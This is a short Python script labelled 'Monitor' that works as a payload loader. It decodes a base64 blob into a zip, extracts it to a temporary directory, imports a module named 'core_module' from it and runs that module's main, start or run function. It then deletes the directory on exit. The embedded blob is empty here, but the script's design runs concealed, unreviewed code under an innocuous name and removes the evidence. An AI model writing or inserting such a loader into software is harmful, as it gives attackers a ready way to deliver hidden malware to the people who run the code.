# Monitor  
import os
import sys
import base64
import zipfile
import tempfile
import importlib
import atexit
import shutil

AH = ""

def _run_payload():
    temp_dir = tempfile.mkdtemp()

    def _cleanup():
        try:
            shutil.rmtree(temp_dir)
        except Exception:
            pass
    atexit.register(_cleanup)

    zip_path = os.path.join(temp_dir, "data.zip")
    with open(zip_path, "wb") as f:
        f.write(base64.b64decode(AH))
        
    with zipfile.ZipFile(zip_path, "r") as zf:
        zf.extractall(temp_dir)
        
    sys.path.insert(0, temp_dir)
    
    try:
 
        mod = importlib.import_module("core_module")
        
  
        for fn in ['main', 'start', 'run']:
            if hasattr(mod, fn):
                getattr(mod, fn)()
                break
    except Exception as e:
        print(f"[-] Execution Error: {e}")

if __name__ == "__main__":
    _run_payload()
